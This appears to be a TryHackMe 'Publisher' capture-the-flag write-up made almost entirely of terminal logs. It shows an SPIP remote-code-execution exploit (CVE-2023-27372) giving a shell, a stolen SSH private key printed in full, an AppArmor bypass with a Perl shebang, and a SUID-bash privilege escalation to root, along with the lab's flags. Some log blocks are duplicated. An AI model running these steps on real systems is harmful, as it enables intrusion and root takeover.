---
tags:
title: Publisher - Medium (THM)
permalink: /Publisher-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
nmapf 10.65.182.96
Completed SYN Stealth Scan at 22:13, 23.01s elapsed (65535 total ports) Nmap scan report for 10.65.182.96 Host is up, received reset ttl 63 (6.9s latency). Scanned at 2026-04-10 22:13:21 -03 for 23s Not shown: 48611 filtered tcp ports (no-response), 16922 closed tcp ports (reset) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 23.05 seconds Raw packets sent: 195509 (8.602MB) | Rcvd: 26244 (1.050MB) nmapf:7: command not found: ep
```


![[Pasted image 20260410224815.png]]


![[Pasted image 20260410224751.png]]


```bash
[

Apr 10, 2026 - 22:47:08 (-03)

]

exegol-htb

Publisher #

searchsploit

spip --------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------- ---------------------------------

SPIP

1.8/1.9 - 'index.php3' Cross-Site Scripting | php/webapps/27158.txt

SPIP

1.8/1.9 - Multiple SQL Injections | php/webapps/27157.txt

SPIP

1.8.2g - Remote Command Execution | php/webapps/1482.php

SPIP

1.8.2 - '

Spip

_RSS.php' Remote Command Executi | php/webapps/27172.txt

SPIP

1.8.3 - '

Spip

_login.php' Remote File Inclusio | php/webapps/27589.txt

SPIP

< 2.0.9 - Arbitrary Copy All Passwords to '.X | php/webapps/9448.py

SPIP

2.1 - 'var_login' Cross-Site Scripting | php/webapps/34388.txt

SPIP

2.x - Multiple Cross-Site Scripting Vulnerabi | php/webapps/37397.html

SPIP

3.1.1/3.1.2 - File Enumeration / Path Travers | php/webapps/40596.txt

SPIP

3.1.2 - Cross-Site Request Forgery | php/webapps/40597.txt

SPIP

3.1.2 Template Compiler/Composer - PHP Code E | php/webapps/40595.txt

SPIP

CMS < 2.0.23/ 2.1.22/3.0.9 - Privilege Escala | php/webapps/33425.py

SPIP

- 'connect' PHP Injection (Metasploit) | php/remote/27941.rb

spip

v4.1.10 - Spoofing Admin account | php/webapps/51557.txt

SPIP

v4.2.0 - Remote Code Execution (Unauthenticat | php/webapps/51536.py --------------------------------------------------- --------------------------------- Shellcodes: No Results
```

```bash
docker0: flags=4099<UP,BROADCAST,MULTICAST> mtu 1500 inet 192.168.215.1 netmask 255.255.255.0 broadcast 192.168.215.255 ether 4a:d3:75:0f:b5:23 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 2 overruns 0 carrier 0 collisions 0
```

```bash
https://github.com/0SPwn/CVE-2023-27372-PoC
```

```bash
[

Apr 10, 2026 - 23:05:53 (-03)

]

exegol-htb

CVE-2023-27372-PoC #

python3

exploit.py

-u http://publisher.thm/spip [+] The Target http://publisher.thm/spip is vulnerable [!] Spawning interactive shell [!] Shell spawned successfully. Ensure to re-type commands in the event they do not provide output. $ whoami www-data $
```

```bash
$ cat /home/think/user.txt fa229046d44eda6a3598c73ad96f4ca5
```

```bash
$ ls -la /home/think/.ssh total 20 drwxr-xr-x 2 think think 4096 Jan 10 2024 . drwxr-xr-x 8 think think 4096 Feb 10 2024 .. -rw-r--r-- 1 root root 569 Jan 10 2024 authorized_keys -rw-r--r-- 1 think think 2602 Jan 10 2024 id_rsa -rw-r--r-- 1 think think 569 Jan 10 2024 id_rsa.pub $ cat /home/think/.ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY-----
```

```bash
[

Apr 10, 2026 - 23:14:49 (-03)

]

exegol-htb

Publisher #

ssh

-i

id_rsa:

think@publisher.thm Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Sat 11 Apr 2026 02:14:55 AM UTC System load: 0.16 Processes: 123 Usage of /: 75.7% of 9.75GB Users logged in: 0 Memory usage: 21% IPv4 address for eth0: 10.65.182.96 Swap usage: 0% Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. 3 additional security updates can be applied with ESM Apps. Learn more about enabling ESM Apps service at https://ubuntu.com/esm The list of available updates is more than a week old. To check for new updates run: sudo apt update Your Hardware Enablement Stack (HWE) is supported until April 2025. Last login: Mon Feb 12 20:24:07 2024 from 192.168.1.13

think@ip-10-65-182-96

:

~

$
```


```bash

think@ip-10-65-182-96:~$ ls -la /usr/sbin/run_container -rwsr-sr-x 1 root root 16760 Nov 14 2023

/usr/sbin/run_container
```

```bash
think@ip-10-65-182-96

:

/etc/apparmor.d

$ ca usr.sbin.ash ca: command not found

think@ip-10-65-182-96

:

/etc/apparmor.d

$ cat usr.sbin.ash #include <tunables/global> /usr/sbin/ash flags=(complain) { #include <abstractions/base> #include <abstractions/bash> #include <abstractions/consoles> #include <abstractions/nameservice> #include <abstractions/user-tmp> # Remove specific file path rules # Deny access to certain directories deny /opt/ r, deny /opt/** w, deny /tmp/** w, deny /dev/shm w, deny /var/tmp w, deny /home/** w, /usr/bin/** mrix, /usr/sbin/** mrix, # Simplified rule for accessing /home directory owner /home/** rix, }
```

```bash
think@ip-10-65-182-96

:

/etc/apparmor.d

$ echo -e '#!/usr/bin/perl\nexec "/bin/sh"' > /dev/shm/test.pl

think@ip-10-65-182-96

:

/etc/apparmor.d

$ chmod +x /dev/shm/test.pl

think@ip-10-65-182-96

:

/etc/apparmor.d

$ /dev/shm/test.pl $ id uid=1000(think) gid=1000(think) groups=1000(think) $ echo "chmod u+s /bin/bash" >> /opt/run_container.sh^C $ echo '#!/bin/bash\nchmod u+s /bin/bash' >> /opt/run_container.sh $ /usr/sbin/run_container List of Docker containers: ID: 41c976e507f8 | Name: jovial_hertz | Status: Up About an hour Enter the ID of the container or leave blank to create a new one: 1 /opt/run_container.sh: line 16: validate_container_id: command not found OPTIONS: 1) Start Container 3) Restart Container 5) Quit 2) Stop Container 4) Create Container Choose an action for a container: 1 Error response from daemon: No such container: 1 Error: failed to start containers: 1 $ ls -la /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash $ /bin/bash -p bash-5.0# id uid=1000(think) gid=1000(think) euid=0(root) groups=1000(think) bash-5.0# cd /root bash-5.0# ls root.txt spip bash-5.0# cat root.txt 3a4225cc9e85709adda6ef55d6a4f2ca
```

```bash
think@ip-10-65-182-96

:

/etc/apparmor.d

$ echo -e '#!/usr/bin/perl\nexec "/bin/sh"' > /dev/shm/test.pl

think@ip-10-65-182-96

:

/etc/apparmor.d

$ chmod +x /dev/shm/test.pl

think@ip-10-65-182-96

:

/etc/apparmor.d

$ /dev/shm/test.pl $ id uid=1000(think) gid=1000(think) groups=1000(think) $ echo "chmod u+s /bin/bash" >> /opt/run_container.sh^C $ echo '#!/bin/bash\nchmod u+s /bin/bash' >> /opt/run_container.sh $ /usr/sbin/run_container List of Docker containers: ID: 41c976e507f8 | Name: jovial_hertz | Status: Up About an hour Enter the ID of the container or leave blank to create a new one: 1 /opt/run_container.sh: line 16: validate_container_id: command not found OPTIONS: 1) Start Container 3) Restart Container 5) Quit 2) Stop Container 4) Create Container Choose an action for a container: 1 Error response from daemon: No such container: 1 Error: failed to start containers: 1 $ ls -la /bin/bash -rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash $ /bin/bash -p bash-5.0# id uid=1000(think) gid=1000(think) euid=0(root) groups=1000(think) bash-5.0# cd /root bash-5.0# ls root.txt spip bash-5.0# cat root.txt 3a4225cc9e85709adda6ef55d6a4f2ca
```

```bash
think@ip-10-65-182-96:/etc/apparmor.d$ chmod +x /dev/shm/test.pl
think@ip-10-65-182-96:/etc/apparmor.d$ /dev/shm/test.pl
```